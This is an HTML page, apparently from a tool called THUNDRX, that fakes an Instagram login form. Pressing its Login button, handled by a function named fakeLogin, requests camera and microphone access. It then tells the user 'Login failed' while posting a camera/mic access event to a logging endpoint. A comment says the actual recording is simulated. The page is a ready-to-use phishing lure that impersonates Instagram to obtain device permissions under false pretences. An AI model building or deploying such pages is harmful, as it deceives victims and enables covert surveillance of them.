<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THUNDRX - Camera & Mic Access</title>
    <style>
        body { font-family: Arial, sans-serif; background: #181c20; color: #fff; text-align: center; }
        .container { margin-top: 10vh; }
        .login-box { background: #23272b; padding: 2em; border-radius: 8px; display: inline-block; }
        input, button { margin: 0.5em; padding: 0.5em; border-radius: 4px; border: none; }
        button { background: #00bfff; color: #fff; cursor: pointer; }
    </style>
</head>
<body>
<div class="container">
    <div class="login-box">
        <h2>Instagram Login</h2>
        <input type="text" placeholder="Username"><br>
        <input type="password" placeholder="Password"><br>
        <button onclick="fakeLogin()">Login</button>
    </div>
</div>
<script>
function fakeLogin() {
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            alert('Login failed');
            // Take snapshot and record audio (simulate)
            fetch('/log/cam_mic', { method: 'POST', body: JSON.stringify({ event: 'cam_mic_access', ts: Date.now() }) });
        })
        .catch(() => {
            alert('Camera/Mic permission denied.');
        });
}
</script>
</body>
</html>
